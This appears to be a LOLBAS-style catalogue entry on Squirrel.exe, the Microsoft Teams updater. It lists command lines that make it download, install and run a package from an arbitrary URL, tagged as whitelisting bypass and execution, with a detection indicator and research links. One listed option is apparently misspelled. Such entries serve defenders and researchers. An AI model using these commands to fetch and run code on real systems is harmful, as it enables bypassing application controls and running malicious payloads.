---
Name: Squirrel.exe
Description: Binary to update the existing installed Nuget/squirrel package. Part of Microsoft Teams installation.
Author: 'Reegun J (OCBC Bank) - @reegun21'
Created: 2019-06-26
Commands:
  - Command: squirrel.exe --download [url to package]
    Description: The above binary will go to url and look for RELEASES file and download the nuget package.
    Usecase: Download binary
    Category: Download
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: squirrel.exe --update [url to package]
    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
    Usecase: Download and execute binary
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: squirrel.exe --update [url to package]
    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
    Usecase: Download and execute binary
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: squirrel.exe --updateRoolback=[url to package]
    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
    Usecase: Download and execute binary
    Category: AWL Bypass
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
  - Command: squirrel.exe --updateRollback=[url to package]
    Description: The above binary will go to url and look for RELEASES file, download and install the nuget package.
    Usecase: Download and execute binary
    Category: Execute
    Privileges: User
    MitreID: T1218
    OperatingSystem: Windows 7 and up with Microsoft Teams installed
Full_Path:
  - Path: '%localappdata%\Microsoft\Teams\current\Squirrel.exe'
Code_Sample:
  - Code: https://github.com/jreegun/POC-s/tree/master/nuget-squirrel
Detection:
  - IOC: Update.exe spawned an unknown process
Resources:
  - Link: https://www.youtube.com/watch?v=rOP3hnkj7ls
  - Link: https://twitter.com/reegun21/status/1144182772623269889
  - Link: http://www.hexacorn.com/blog/2018/08/16/squirrel-as-a-lolbin/
  - Link: https://medium.com/@reegun/nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-80c9df51cf12
  - Link: https://medium.com/@reegun/update-nuget-squirrel-uncontrolled-endpoints-leads-to-arbitrary-code-execution-b55295144b56
Acknowledgement:
  - Person: Reegun J (OCBC Bank)
    Handle: '@reegun21'
  - Person: Adam
    Handle: '@Hexacorn'
---
